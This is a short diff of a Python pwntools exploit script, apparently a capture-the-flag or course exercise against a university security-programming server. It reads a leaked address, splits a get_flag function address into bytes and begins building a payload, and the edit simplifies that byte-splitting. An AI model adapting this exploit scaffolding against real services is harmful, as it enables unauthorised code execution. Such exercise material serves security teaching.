@@ -4,14 +4,11 @@ from pwn import *
 
 r = remote("secprog.cs.nctu.edu.tw",10105)
 
-data = r.recv()
 r.recvuntil("at ")
 data = int(r.recvn(10),16)
 
-print hex(data)
-
 get_flag = int("0x804861d",16)
-get_flag = [ ( get_flag % ( 1 << 8 * ( i + 1 ) ) ) >> ( 8 * i ) for i in xrange(4) ]
+get_flag = [ ( get_flag >> ( 8 * i ) ) & 0xff for i in xrange(4) ]
 
 payload = ""
 
